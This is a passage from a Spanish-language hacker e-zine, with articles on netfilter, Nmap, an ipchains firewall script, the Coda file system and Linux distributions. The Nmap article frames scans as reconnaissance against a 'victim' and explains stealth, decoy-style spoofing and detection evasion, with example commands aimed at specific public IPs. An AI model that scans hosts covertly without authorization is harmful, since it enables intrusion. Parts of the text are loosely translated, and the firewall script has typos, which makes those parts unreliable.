viene con la cabecera completa (IP + TCP, UDP e ICMP) y el firewall puede examinarlo, pero el 
resto de los fragmentos solo vienen con una parte de la cabecera del paquete (con la IP pero 
sin la parte de los protocolos), por lo tanto no podemos filtrar los fragmentos segun el 
protocolo pues es imposible determinarlo. Esto es un problema debido al protocolo tcp no a 
una implementacion de iptables, para ello se puede recurrir al uso de conn_traq o reensamblar 
los paquetes usando los datos IP.


3.0 Despedida:
==============

Uff alfin terminamos jeje que largo salio todo esto, pero bueno lo trate de hacer de la forma
mas explicativa y facil posible para que entendieran, espero que alla sido de su agrado este
texto sobre netfilter a y grax a las personas que leen esta magazine. chausss...


cdt_911@hotmail.com



7. El amigo Nmap ============================================================================
By [EL_CoNaN] fUll Disclousure ==============================================================
=============================================================================================

Hola aca estamos de nuevo, y les presento al amigo Nmap :-) para el mundo hack, ejale y 
aca explicare como funciona esta potente herramienta para linux y los fuimos con el Nmap.
Ustedes diran este wn no se pierde una ejeje, pero ya saben me gusta escribir....


Nmap:
=====

Es un programa que nos sirve para ser un scan de redes o host que nos sirve muchisimo ya 
que nos da informacion muy caliente a la hora de elaborar un hack a un host o redes, 
este programa fue creado por Fyodor y hoy en dia es una de las herramientas mas famosas
gracias a su facilidad de uso, versatilidad y efectividad.

Este programa ademas utiliza varios protocolos como el udp y el tcp, dentro de la gama 
de funciones que este realiza se encuentran el scan oculto para no ser detectado por 
los host o redes en la cuales usan firewall o son muy cuidadosos con la seguridad :-),
tambien esta el scan nulo como el Xmas para a si evitar como decia ser detectados por 
mecanismos de seguridad extremadamente sensibles, tambien tiene el poder de prueba para 
ver algunas vulnerabilidades como el bounce attack.

Este programa se puede utilizar para sacar mas informacion que simplemente ver que 
puertos abiertos tiene el host o la red, puede determinar el S.0 de la victima ya que 
utiliza el stack del protocolo tcp, tambien es capas de generar un D.O.S en los host o 
maquinas haciendo la funcion de router en determinadas condiciones.

Este programita posee multiples opciones que pueden ser combinadas entre si ya que no 
importa el orden en que pases estas opciones en la lineas de comandos.

El uso del Nmap es de la siguiente manera:
	
{tipo de scan} {opciones}   -> victima o red <-



Tipos de scan:
==============

-sT ---> Una conexion tcp, ojo este tipo de scan deja ver tu ip en la victima (log)


-sS ---> Tcp oculto, solo estando como root lo puedes ejecutar.


-sF, -sX,-sN ---> Scan nulo (solo trabajara en unix) el nombre de scan nulo se le da ya 
      		  que este tipo de scan trata de molestar lo menos posible al demonio de 
		  servicios para si no salir en los log del sistema, esto es explicable 
	    	  a los miles de host que hay con firewall en la red y que poseen filtrado 
		  para paquetes del tipo SYN, esto quiere decir que quedariamos 
		  automaticamente gravados en los log del sistema al no hacer un scan del 
		  tipo sF, -sX,-sN.


-sU ---> Scan de puertos abiertos con protocolo UDP y solo lo puedes ejecutar como root.

-f  ---> Utiliza paquetes pequeños fragmentados  para el SYN , Xmas , FIN o barrido nulo 
         haciendo asi mas dificil la deteccion del scan.

-P0 ---> No hace ping a los host en cuestion, este es necesario para el scan de sistemas 
         en los cuales usan  deteccion de ataques sensibles.

-b ---> bounce attack para ver si se puede utilizar un host para pasar una conexion ftp 
	a travez de el y no hacer el ftp a otro host desde tu maquina directamente.

-sP ---> (ping) es para saber si determinados host(s) estan en ese preciso momento 
	 conectados a inet, esto lo realiza el Nmap enviado paquetes a el puerto 80 
	 de un host, ojo porque algunos sistemas tienen filtrado de paquetes en el 
	 puerto 80 por lo que podras ser detectado, pero puedes utilizar esta opcion 
	 combinada con -PI y asi cambiar el puerto 80 por otro puerto mas conveniente.

-PT ---> Utiliza el Ping de tcp para determinar si un host esta  conectado, para  el 
	 caso de -sT y -sP esta opcion aunque no es suministrada va implicita en el 
	 metodo.

-PT21 ---> Utiliza la opcion ping para hacer pruebas de conexiones al puerto 21 o a 
	   cualquier otro especificado despues del -PT  ej: -PT80.

-PI ---> Este utiliza paquetes ICMP para asi determinar que hosts estan conectados, 
	 este sirve mucho si quieres hacer un scan a traves de un host que tenga un 
	 firewall.

-PB ---> Cumple la misma funcion del scan TCP y ICMP, se puede especificar un puerto 
	 de destino despues de la B ejemplo: -PB25.

-PS ---> Este  Utiliza el TCP SYN sweep en lugar de el valor por defecto que es el Hack
	 sweep utilizado en el Ping TCP.

-F ---> Scan rapido, solo examina los puertos que estan en /etc/services.

-p ---> Rango de puertos un ejemplo seria algo asi: -p21 esto solo intenta conectar con los 
	host(s) especificados para sacar la info necesaria para las operaciones del 
	scan, aca veremos otro ejemplo para que quede mas claro: -p10-100,3340- esto hace 
	un scan entre los puerto 10 y 40 y entre 3340-65535. por defecto el scan es 
	entre los puertos 1 y el 1024  y a esos agregale los que aparecen en /etc/services.

-I ---> toma la info del dueño del proceso que se esta ejecutando  pero solo se ejecuta 
	con el -sT  por lo que deja una traza muy grande en los log de la victima.

-n ---> Este no hace conversiones DNS para hacer el -sP mas rapido.

-R ---> Este intenta convertir utilizando DNS un ejemplo seria algo asi: -R192.168.1.23 y te 
	muestra "hostconan" 

-o ---> Guarda el mismo archivo mostrado en pantalla en un log entendible para el ojo 
	humano :-). 

-m ---> Casi mismo que lo de arriba pero lo muestra en formato maquina.

-i ---> Este lee los log, ip(s) de las victima(s) desde un vil archivo.

-g ---> Este indica que puerto local se usa para enviar los paquetes para el scan.

-S ---> Este te permite especificar una ip para que haga de fuente del scan, por lo que 
	puedes hacer un Scan Spoofing, jeje que wena no :-).

-v ---> muestra + info =P.

-h ---> Muestra la ayuda del Nmap.

-V ---> permite ver la version del Nmap.

-e ---> Permite esta opcion enviar paquetes a traves de esa interfase en tu host pueden 
        ser ppp0,ppp1 etc.

-O ---> Esta opcion Utiliza el TCP/IP "fingerprinting" para determinar  que  Sistema
        operativo esta corriendo un host remoto 



Algunos ejemplos:
=================

ej1: tenemos nuestra victima que tiene el ip 200.11.26.45 y para hacer un scan simple de 
==== este host  hay que hacer solo esto:  $nmap 200.11.26.45 y esto los tirara info de 
     todos los puertos abiertos de este host.


ej2: si deseas ver  puertos especificos del ip 200.34.66.78 para ver si estan disponibles 
==== solo haces esto:

     $nmap -p 21,23,110,139  200.34.66.78 y de esta manera estaremos haciendo el scan a 
     los puertos que nos interesan ver, en este caso 21,23,110,139.  


ej3: si quiero ver el S.0. del host victima  que tiene la ip 200.24.56.76 solo tengo que 
==== hacer lo sgt: 

     #nmap -sS -O 200.24.56.76. aca usamos la opcion -sS  para que asi no los detecten 
     en la maquina victima al momento de tratar de ver que S.O. corre.

ej4: Para determinar si un host victima con el ip 200.11.34.67 es vulnerable al bounce 
==== attack tecleamos lo sgt: $nmap -b  200.11.34.67 y si  el sistema tiene mecanismos 
     sensibles de deteccion de intrusos lo aremos de la siguiente forma: $nmap -P0 -b 
     200.11.34.67. Asi evitamos dejar algun rastro de nuestro ip. 



Despedida
==========

Hemos llegado al fin de esta seccion de como conocer el Nmap, ojala alla quedado claro y 
les alla gustado la seccion y la e-zine completa :-), bueno para cualquier sugerencia, 
critica, etc. Hacerlas al mail cdt_911@hotmail.com mencion conan, bueno no queda mas que 
despedirme y seguir trabajando para ser mas conocido el under chileno, bye hasta la proxima.



8. Como montar un Firewall en GNU/Linux =====================================================
By Nacho23 ==================================================================================
=============================================================================================


Requisitos previos:
===================

Deberemos tener en nuestro equipo instalado GNU/Linux y una conexion a internet 
configurada y funcionando.. o sino pa que cresta vamos a instalar un firewall si 
nuestro pc esta totalmente aislado :). Para montar nuestro firewall deberemos tener una 
version del kernel no inferior a 2.0.x y tener instalado el paquete IPCHAINS.¿Por que 
ipchains? y no iptables que es mucha mas actual.. bueno esto es porque iptables no 
corre en version del kernel 2.2.x que estan muy difundidas por ahi. ok teniendo todo lo 
anterior en cuenta... comencemos :)

Filtrado de paquetes:
=====================

La transmision de datos entre computadores en Internet se realiza siempre utilizando
TCP o UDP, ambos protocolos exigen que las transmisiones se hagan desde un puerto
concreto en el pc de origen a otro en el de destino. Estos puertos son puertos "logicos"
pero se comportan de forma similar al puerto serie o paralelo. Esto en el sentido de
que para cada puerto hay un programa que esta dando un determinado servicio. Las
conexiones por lo tanto se realizan a travez de puertos en general estan establecidos
segun diversos estandares, por ejemplo las conexiones de FTP se realizan por el
puerto 21, HTTP por el puerto 80, POP3 por el 110. En la instalacion de nuestra
distribucion linux podemos encontrar una lista con nombres de servicios y sus puertos
en /etc/services . Pero en este archivo no estan todos lo puertos que debemos
proteger, deberemos buscar en Internet los puertos que suelen utilizar los viruz y
troyanos.

Reglas de filtrado:
===================

Como deciamos antes para instalar un firewall debemos tener un kernel con las opciones 
adecuadas y el paqueta ipchains. Podemos ejecutar ipchains a mano e introducir a mano 
todas las reglas de filtrado, pero seria una pura perdida de tiempo ya que al apagar el 
pc se perderia todo y tendriamos que introducirlas de nuevo. Asi que para no tener que 
hacer esto cada vez, crearemos un archivo que se ejecute durante el arraque algo asi como 
/etc/rc.boot/ipchains , el que editaremos (como root) y pondremos aqui las reglas 
necesarias. Deberemos ver bien la documentacion de la distribucion de linux que tengamos 
para decidir cual sera el lugar mas adecuado para ubicar nuestro scripts, puesto que
quizas nos interese solo tener el firewall activo cuando nos conectemos a internet y no 
todo el tiempo. una vez que este creado el script (despues lo veremos) deberemos darle
permiso de ejecucion, ejecutaremos entonces como root: chmod 600 /etc/rc.boot/ipchains
Cada vez que se modifique el archivo deberemos asignarle nuevamente estos permisos.

Construccion de las reglas de filtrado:
=======================================

Las reglas de filtrado son las lineas de ejecucion que ponemos en el archivo ipchains
son relativamente simples, primero va el ejecutable, ipchains con su path,y luego sus
parametros.

El primer parametro es -F,-P o -A hay otras pero nos bastara con estas tres para empezar
si se indica '-F' se hara un "flush", una especie de reset o puesta a cero. esto hace
que se ignoren las reglas aplicadas anteriormente. Indicando -P sobre una cierta cadena
indicaremos la politica por defecto para esa cadena. Por defecto la politica para las
tres cadenas iniciales (INPUT,OUTPUT,FORWARD) es "ACCEPT".
Si se le indica -A  estaremos diciendo que queremos que esa regla se añada a la cadena
que especifiquemos en el Kernel, a continuacion de este parametro se suele indicar el 
tipo de conexion a la que se refiere la regla. Como deciamos hay tres tipo posibles: 
entrada, salida y forward (reenvio).

El parametro -p sirve para indicar el protocolo de la conexion, que por lo general son 
UDP y TCP. Podemos ver los protocolos que podemos poner aca en /etc/protocols.
El parametro -d sirve para indicar la ip de destino de la transmision.
El parametro -s sirve para indicar el origen de la transmision.
El parametro -j sirve para indicar la accion concreta que se llevara a cabo para los 
paquetes afectados por esta regla. Las acciones posibles para la accion son : ACCEPT, 
DENY, REJECT, MASQ, REDIRECT o RETURN, que al buen chileno corresponden a aceptar, 
negar, rechazar, enmascarar, redirigir y volver (no hacer nada).

Un ejemplo completo  (el archivo ipchains)
===========================================

#===============================================================================
#============================= Comienzo del Script =============================
#!/bin/bash
# primero vamos a asignar tu ip vardadera a la variale mi_ip
MI_IP="$PPP_LOCAL"
#luego pones en reset todas las instrucciones que pueda tener el ipchains, asemos
#un flush ... jejeje que suena cuatico.
/sbin/ipchains -F
#despues aplicamos las tres reglas por defecto:
#1. se cierran las aplicaciones de entrada por defecto.
/sbin/ipchains -P input DENY
#2. se cierran las conexiones de forward por defecto.
/sbin/ipchains -P forward DENY
#3. se abren las conexiones de salida por defecto.
/sbin/ipchains -P output ACCEPT
#ahora biene lo bueno, despues de haber aplicado las reglas de politicas por defecto,
#Aceptamos las conexiones de entrada desde procesos locales (por ejemplo a interfaz 'lo')
/sbin/ipchains -A input -i lo -j ACCEPT
#Aceptamos las conexiones de entrada provenientes de IPs de la red local, que entren por
#cualquier interfaz menos ppp0, ejemplo del PC 1 hasta el 24
/sbin/ipchains -A input -s 192.168.0.1/24 -i ! ppp0 -j ACCEPT
#ahora rechazamos los fragmentos de paquetes ICMP... jejeje te suenan los nukes en Windows?
/sbin/ipchains -A input -p icmp -f -d $MI_IP -i ppp0 -j DENY
#pero tenemos que aceptar los paquetes ICMP normales.. para poder responder a los ping por
#ejemplo.
/sbin/ipchains -A input -p icmp -d $MI_IP -i ppp0 -j ACCEPT
#puff que hay que hueviar... bueno ahora aceptamos las conexiones al puerto 80 para que
#nuestro webserver se pueda ver en el exterior.
/sbin/ipchains -A input -p tcp-d $MI_IP 80 -i ppp0 -j ACCEPT
#ahora nos cuidamos de los troyanos rechazando las conexiones UDP y TCP de algunos
#puertos tipicos de los troyanos como el BO y el Sub7. Fijense en como se manejan
#los rangos de puertos.
/sbin/ipchains -A input -p udp -d $MI_IP 12345:12346 -i ppp0 -j DENNY
/sbin/ipchains -A input -p tcp -d $MI_IP 12345:12346 -i ppp0 -j DENNY
/sbin/ipchains -A input -p udp -d $MI_IP 31337 -i ppp0 -j DENNY
/sbin/ipchains -A input -p tcp -d $MI_IP 31337 -i ppp0 -j DENNY
/sbin/ipchains -A input -p udp -d $MI_IP 5999:6010 -i ppp0 -j DENNY
/sbin/ipchains -A input -p tcp -d $MI_IP 5999:6010 -i ppp0 -j DENNY
#ahora rechazamos las conexiones al puerto dde MYSQL, responsable de muchos ataques
#DOS y caida de sistema en linux.
/sbin/ipchains -A input -p udp -d $MI_IP 3306 -i ppp0 -j DENY
/sbin/ipchains -A input -p tcp -d $MI_IP 3306 -i ppp0 -j DENY
#ahora aceptamos todas las conexiones que no sean las anteriores.. obvio. :D
#desde el puerto 1024 hasta todos los superiores a el por eso el 1024: que es el
#equivalente a 1024:65535
/sbin/ipchains -A input -p udp -d $MI_IP 1024: -i ppp0 -j ACCEPT
/sbin/ipchains -A input -p tcp -d $MI_IP 1024: -i ppp0 -j ACCEPT
#ahora no permitimos ningun otro tipo de conexion entrante.
/sbin/ipchains -A input -p tcp -y -d $MI_IP -i ppp0 -j DENY
#y por ultimo enmascaramos las conexiones de forward desde direcciones IP de la red
#local hacia el exterior.
/sbin/ipchains -A forward -s 192.168.0.1/24 -i ppp0 -j MASQ

#====================================================================================
#==================== FIN DEL ARCHIVO ===============================================



Despedida:
==========

Pufff medio weveo...mejor uso una herramienta grafica. :D , pero ese tipo de herramientas
trabaja sobre el commando ipchains tal cual lo hemos hecho ahora, no esta demas conocer
como trabaja por medio de la consola.



9. Sistema de Ficheros Distribuidos Coda ====================================================
By BoGu5 ====================================================================================
=============================================================================================
 

Hix gente...bueno este es mi primer articulo para esta ezine y antes q nada me gustaria
presentarme a este mundo...emmm soy un estudiante escolar de 16 años...(colegio s0x me 
tiene chato) y me gusta mucho esto de la informatica en general :/ (cuando grande quiero 
estudiar ingenieria en infor..pero ta muy plaga esa wa..), ya filo...volviendo al tema 
espero q este articulo les guste...

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
El objetivo de este articulo es dar un paseo por la introduccion del Sistema de Ficheros
Distribuido Coda blablabla..               
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Ok vamos directo al grano.. emmm para ser exactos, el sistema de ficheros distribuido 
Coda es un sistema de ficheros experimental avanzado desarrollado por el grupo de M. 
Satyanarayanan en la universidad de Carnegie Mellon.

Al igual q yo, se preguntaran q chucha es un sistema de ficheros distribuidos, aqui 
les va.. Un sistema de ficheros distribuido almacena archivos en unas o mas computadoras 
llamadas servidores, y las hace accesibles a otras computadoras llamadas clientes, donde 
aparecen como archivos normales. Hay varias ventajas a usar los servidores de archivos, 
los archivos estan mas extensamente disponibles puesto que muchas computadoras pueden 
tener acceso a los servidores, y compartir los archivos de una sola localizacion es mas 
facil que copias que distribuyen de archivos a los clientes individuales. Las reservas 
y la seguridad de la informacion son mas faciles de arreglar, puesto que solamente los 
servidores necesitan ser sostenidos. Los servidores pueden proporcionar de un espacio de 
almacenaje grande, que pudo ser costoso o impractico de proveer a cada cliente. La
utilidad de un sistema de ficheros distribuido, llega a estar clara cuando en vista de 
un grupo de empleados, comparten documentos. Sin embargo, tambien es posible por ejemplo, 
compartir software, de uso es un candidato igualmente bueno. En ambos casos la 
administracion del sistema llega a ser mas facil.  

Hay muchos problemas que hacen frente al diseño de un buen sistema de ficheros 
distribuido:

.- El transporte de muchos archivos sobre la red puede crear facilmente funcionamiento 
   inactivo y el estado latente.

.- Los embotellamientos de la red y la sobrecarga del servidor que pueden resultar.

.- La seguridad de datos es otra cosa importante (obvio) :P ¿cOmo podemos ser seguros que 
   autorizan a un cliente realmente a tener acceso a la informacion y como podemos 
   prevenir los datos que son olidos de la red?...

Dos problemas mas que hacen frente al diseño se relacionan con las faltas. Las 
computadoras del cliente son a menudo mas confiables que la red que las conecta y ademas 
los fallos de la red pueden hacer a un cliente inutil! jeje como Mt_MoT o karkito... 
Semejantemente una falta del servidor puede ser muy desagradable, puesto que puede 
inhabilitar a todos los clientes de tener acceso a la informacion crucial.

El proyecto de Coda ha prestado la atencion a muchas de estas ediciones y las ha puesto
en ejecucion como prototipo de la investigacion... jeje q me salio lindo...(la wa fleta).

Coda fue puesto en ejecucion originalmente en Mach 2,6 y se ha ido incorporando hacia el 
lado rulz, osea a Linux, a NetBSD y a FreeBSD. Michael Callahan mando una porcion hacia el
lado de babor grande de Coda a Windows 95 y se encuentran estudiando a Windows NT para 
entender que la viabilidad de virar Coda hacia el lado de babor de sus esfuerzos del NT 
esta actualmente en puertos y en la fabricacion del sistema mas robusto. Se estan poniendo
en ejecucion algunas nuevas caracteristicas y en varias areas los componentes de Coda se 
estan reorganizando. Estos lokos han recibido ya ayuda muy abundante de usuarios en la red 
y se espera que esta continue. 

Quizas Coda puede convertirse en un sistema de ficheros distribuido popular, extensamente
usado y  disponible libremente.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Emm bueno pero ¿como Coda actua en un cliente?...:D si Coda esta funcionando en un 
cliente, que tomaremos para ser un sitio de trabajo de Linux, bajo el directorio 
/coda el cliente monta un sistema de ficheros de tipo "Coda".  Todos los archivos, que 
cual quiera de los servidores pueden proporcionar al cliente,  estan disponibles debajo 
de este directorio, y de todos los clientes ven el mismo espacio de nombres. Un cliente 
conecta a todo el sistema Coda y no con los servidores individuales (como lo hace NFS) 
que vienen en juego invisiblemente.

Coda es absolutamente diferente de sistemas de ficheros del montaje NFS que se hace por el 
servidor, por base de la exportacion.  En los sistemas mas comunes de Windows (CIFS de 
Novell y de Microsoft) asi como con Appleshare en el Macintosh, los archivos tambien se 
montan por volumen. 

El sistema de ficheros de Andrew File System (AFS), precursor de Coda, inicio la idea y 
almaceno todos los archivos debajo los /afs.  Semejantemente el sistema de ficheros 
distribuido DFS/DCE de OSF, monta sus archivos bajo un directorio. El nuevo sistema de 
ficheros distribuido de Microsoft (dfs) proporciona el pegamento para poner todas las 
partes del servidor en un solo arbol de ficheros, similar al pegamento proporcionado un 
auto-mount de demonios y Yellow Pages en Unix.  ¿Por que es un solo punto del montaje 
ventajoso?... Significa que todos los clientes pueden ser configurados identicamente, y 
los usuarios veran siempre el mismo arbol de ficheros. Para las instalaciones grandes 
esto es esencial. Con el NFS, el cliente necesita una lista actualizada de los servidores 
exportado en /etc/fstab de los directorios, mientras que en Coda las necesidades de un 
cliente simplemente de saber donde encontrar el directorio de raíz del Coda (/coda). 
Cuando se agregan los servidores nuevos o las partes el cliente descubrira estos 
automaticamente en alguna parte en arbol /coda.

Para entender como Coda puede funcionar cuando las conexiones de red al servidor se han 
separado, vamos analizar una operacion simple del sistema de ficheros. emm supongamos que 
tipiamos: "cat/coda/tmp/foo" para exhibir el contenido de un archivo de Coda. ¿Qué sucede 
realmente? El programa "cat" hara algunas llamadas del sistema en lo referente al archivo.

Una llamada del sistema es una operacion con la cual un programa pide el nucleo del 
servicio, por ejemplo, al abrir el archivo el nucleo deseara hacer una operacion a las 
operaciones de busqueda para encontrar el inode del archivo y para volver una manija del 
archivo asociada al archivo al programa. El inode contiene la informacion para tener 
acceso a los datos en el archivo y es utilizado por el nucleo, la manija del archivo 
esta para el programa de la abertura. La llamada abierta, incorpora el sistema de ficheros 
virtual (VFS) que se comunicaran con el VFS del nucleo. Luego la wa del VFS comprueba que 
la peticion se refiere a un fichero coda y encamina la peticion al modulo del sistema de 
ficheros coda en el nucleo (Coda FS). Este modulo mantiene un cache de peticiones 
recientes resueltas, y si la respuesta no se encuentra en esta cache.. em cago la wa no 
mas poz..jeje no paja naipe aqui va...  se encamina de nuevo la peticion al gestor del 
cache Coda Venus mmm ¿pero por donde xuxa? jeje ..a traves del dispositivo de caracter 
/dev/cfs0. Venus comprobara si el fichero coda/tmp/foo se encuentra en un segundo cache,
almacenado en el disco, y en caso contrario grrr...contactara con los servidores (Vice) 
para obtenerlo. Luego de conseguir el fichero s0x Venus respondera al nucleo, quien 
devolvera la respuesta al programa cat...la mea kaga.. oooh! si.. :P

Cuando el nucleo pasa la peticion abierta a Venus, para la primera vez, Venus trae el 
archivo entero de los servidores, usando un procedimiento alejado llama para alcanzar 
los servidores. Entonces almacena el archivo (un archivo del envase en el area del 
escondrijo (currently/usr/coda/venus.cache/).  El archivo ahora es un fichero ordinario
en el disco local, y las operaciones de lectura/grabacion al archivo (casi) no alcanzan 
pero con Venus son dirigidas enteramente por el sistema de ficheros local (ext2 para Linux). 

Las operaciones de lectura/grabacion de Coda ocurren a la misma velocidad que esos a los 
archivos locales. Si el archivo se abre una segunda vez, no sera traido de los servidores 
otra vez, pero la copia local estara disponible para el uso inmediatamente. Archivos de 
directorio (recuerde: un directorio es justo un archivo) tan bien como todas las cualidades 
(propiedad, permisos y tamaño) son todas depositadas por Venus, y Venus permiten que las 
operaciones procedan sin entrar en contacto con el servidor si los archivos estan presentes 
en el escondrijo. Si se ha modificado el archivo y es cerrado, entonces Venus pone al dia 
los servidores enviando el archivo nuevo. Otras operaciones que modifican el sistema de 
ficheros, tal como fabricacion de directorios, quitar archivos o directorios y crear o 
quitar acoplamientos (simbolicos) se propagan a los servidores tambien.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

El origen de la operacion desconectada en Coda, miente en una de las punterias de 
investigacion originales del proyecto: para proveer de un sistema de ficheros resistencia 
a los fallos de la red.  AFS, que apoyo 1000 clientes en los ultimos años 80 en el campus 
de CMU habia llegado a ser tan grande, que las interrupciones de la red y las faltas del 
servidor que sucedian en alguna parte casi cada dia se convirtieron en un fastidio. 
Resulto ser un esfuerzo bien medido el tiempo, puesto que con el advenimiento rapido de 
los clientes moviles (computadoras portatiles) y la ayuda de Coda para las redes y los 
servidores que fallaban Coda se aplico igualmente a los clientes moviles.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Bueno, Coda ofrece distintos niveles de seguridad mediante Kerberos grrr me explico por 
la shashu.. osaea no cifrar, cifrar solo los paquetes de protocolo interno; cifrar ademas
las cabeceras de los mensajes; y cifrado completo. 

Despedida:
==========

Ya con esto termino ..emmm espero q les haya gustado aunque la wa ta s0x pero sirve pa 
quien no sabe poz como yo jeje...sera mejor q me mande un articulo completo sobre este 
tema porque aqui solo abarque como un intro de todo lo q es esto de Coda...mas encima 
falta mas q la xaxu por ejemplo como instalar un servidor SCM en redhat o lesbian emmm.. 
comandos CFS Volumenes, servidores y replicaciones mmm...y muchas otras was q aqui no 
alcanzan (solo porq es un articulo) emm bueno ustedes saben.. pero en otra  ocacion sera. 

(Para mas info visitar web oficial de Coda http://www.coda.cs.cmu.edu ) :S



10. Introduccion a Linux ====================================================================
By  _Alphaice_  [From the DarkStar of DarkSide]...por una Cultura Digital ===================
=============================================================================================

Aki toy yo pah variar, otra vez, repetido (no tanto como [El_CoNaN] jejeje) bueno me toco a 
mi tratar este tema, pero tema que vamos a tratar por partes te preguntaras por que???, 
bueno este tema es un poco estructurado y lo miraremos de una manera acogedora y comoda. La 
idea es que si eres un usuario de Windows y deseas migrar a Linux vayas a aprender paso a 
paso y con comparaciones para que no llege a ser tu primer encuentro con Linux algo 
traumatico... como les ha pasado a muchos, bueno vasta de hablar (o de escribir :p jejeje) 
y empecemos.


0. Antes de.... 
================

Bueno en estos momentos me gustaria ser sincero con ustedes, a que me refiero... me refiero 
a que para empezar yo no soy un guru en esto incluso puedo decir que aun tengo aquello de 
novato en linux y esto se debe a que antes nadie me habia abierto mis ojos para mostrarme 
este mundo tan hermoso y la experiencia de tener este sistema operativo tan poderoso e 
interesante como es Linux y por eso me gustaria agradecer a tres amigos que aunque no nos 
conocimos bien yo pude asimilar lo que era Linux gracias a las millonadas de preguntas que 
les hice je je je... asi que me gustaria agradecer a Zorbas, Angel (FatKiller) y 
especialmente a M4nd4tory por su paciencia al enseñarme a instalar SlackWare. Despues de 
esta emocionante parte, me queda decir que espero que les guste esta seccion que nos ira 
mostrando el facinante mundo Linux y mostrarles a los novatos o los que van a probar este 
Sistema Operativo que es interesante probar y aprender.


1. Que es Linux / Algo de historia:
===================================

Buena pregunta... Linux es un Sistema Operativo (ya deberias saber que es un Sistema 
Operativo) resumiendo un S.O. es el software que controla los procesos dispositivos, etc.
Ademas podemos decir que es un derivado de Unix o sea que se parece pero ¡no es lo mismo!, 
incluso no comparte ninguna linea de codigo podria decirse que Unix es uno de los padres de 
Linux junto con Minix, bueno para empezar con la historia Linux fue creado en el año 1991 
por Linus Torvalds en esos años estudiante universitario Finlandes con unos escasos 23 años 
logra crear la base de un sistema operativo y lo publica en Inet para que otros se le unieran 
para comenzar el desarrollo de este.


2. Distribuciones:
==================

En el mundo Linux existen alrededor de 108 distribuciones (bueno eso fue lo que lei 
ultimamente) pero las mas famosas son como 6 o 7 bueno ahi las vamos contando ok.

Que es una Distribucion:
=========================

En si Linux es solo el nucleo o kernel del sistema operativo, pero este necesita de programas 
y aplicaciones para que funcione y para esto se crearon las distribuciones y estan a cargo de 
empresas que se empeñan en programarlas, distribuirlas y mejorarlas.

En si las distribuciones nacieron de la necesidad tener un linux mas avanzado te preguntaras 
por que digo esto???, bueno porque antiguamente cada usuario programaba sus dispositivos y 
mejoraba su sistema por si mismos y los novatos que nunca habian tenido experiencia alguna 
programando o con Unix simplemente no podian utilizar Linux por lo mismo, asi nacieron las 
distribuciones para hacer mas facil la vida del usuario corriente, me imagino que tu no eres 
de ese tipo de usuario asi que con esta entretenida seccion vamos a aprender a usar Linux mas 
alla de solo usar el x-windows (si no sabes que es esto... no te preocupes mas abajo te lo
enseñare... jejeje).

Las distribuciones mas famosas son las siguientes:
==================================================

Slakware:
=========
 
Esta es famosa por ser la primera distribucion que nacio en el entorno Linux, al paso de los 
años esta fue perdiendo popularidad y ahora es de uso para para personas expertas por cosa 
de complejidad ya que su instalacion y configuracion es un tanto dificultosa para los 
novatos. Podemos decir que esta distribucion es buena pero no es para novatos a no ser que 
sean guiados... me paso a mi, yo comence con esta distribucion porque me dijieron que me 
fuera con lo mas dificil para aprender bueno al final resulto ya que dejando la &"$%@$%$ se 
aprende porque no me es dificil instalar cualquier otra distribucion (a no ser Debian... aun 
no me lo he conseguido) ya que siempre es mas facil que instalar Slack, lo que dije 
anteriormente se puede aplicar con cualquier novato pero yo aconsejo no hacerlo si no tienes 
a alguien cerca o alguien que te pueda guiar porque o sino te puedes quedar sin computador.
El punto debil de esta distribucion es su sistema de instalacion de paquetes ya que no tiene 
el control de versiones o sobre su instalacion. 
http://www.slackware.com

Debian:  
=======

Muy famosa se encuentra en uno de los escalafones mas altos del poder de Linux porque esta 
distribucion no esta hecha por una empresa, por el contrario esta es hecha por programadores 
y hackers voluntarios en su totalidad o sea que esta hecha por gurus en el tema por lo tanto 
es usada por personas especializadas en Linux, asi que no es recomendada para novatos ya que 
su instalacion es dificultosa (acaso leiste lo que dije sobre Slackware???), pero no te 
desalientes si digo que es dificil pero no imposible :). Por lo contrario de Slack este si 
tiene un sistema de paquetes el DEV Devian package manager con el cual podemos manejar los 
programas de nuestra maquina. Se puede decir que esta es una de las mejores distribuciones 
de Linux. 
http://www.debian.org

SuSe:
=====

Esta distribucion creada por una empresa alemana es una de las mas polulares del mundo por 
su facil instalacion y por ser muy completa (la ultima vez que la vi tenia 7 cds y 1 dvd) 
esta utiliza el sistema de instalacion de paquetes de RedHat RPM Redhat package manager, esta 
distribucion es muy usada por personas que se inician en el mundo de Linux por su facilidad 
de instalacion, uso y configuracion.
http://www.suse.de

RedHat:
=======

Esta distribucion quizas en estos momentos es una de las mas famosas entre los usuarios en 
general y los novatos, por su facil instalacion que no necesita muchas neuronas para lograrla 
exitosamente y su facil uso y configuracion es totalmente recomendable para los que recien se 
inician con Linux esta distribucion nacio en EEUU. El sistema de intalacion de paquetes es el 
RPM que es totalmente de RedHat. Cabe destacar que hace ya algun tiempo salio la version 8.0 
de Red Hat.
http://www.redhat.com
http://www.redhat.es

Madrake: 
========

Esta distribucion que inicialmente era un clon de RedHat en estos momentos es una de las 
distribuciones mas usadas entre los novatos y usuarios en general tal como lo hace RedHat, 
estas ultimas le dan un gran enfasis al entorno grafico KDE o Gnome (bueno no hace falta 
decirlo ya lo explicare) esta es totalmente recomendable para los novatos, pero cuidado no te 
quedes con lo facil por lo facil.
http://www.linux-mandrake.com 


Caldera OpenLinux:
==================

Esta distribucion creada por una compañia norteamericana llamada Caldera crearon esta 
distribucion a la cual la llamaron OpenLinux, basada en los paquetes de RedHat (RPM) y 
con un sistema de instalacion muy amigable llamada Linux Wizard, es pensada para entornos 
comerciales como las aplicaciones de oficina Aplixware y Corel WordPerfect. Esta compañia 
ostenta asociaciones con empresas tan importantes como Novell e IBM, como podras darte 
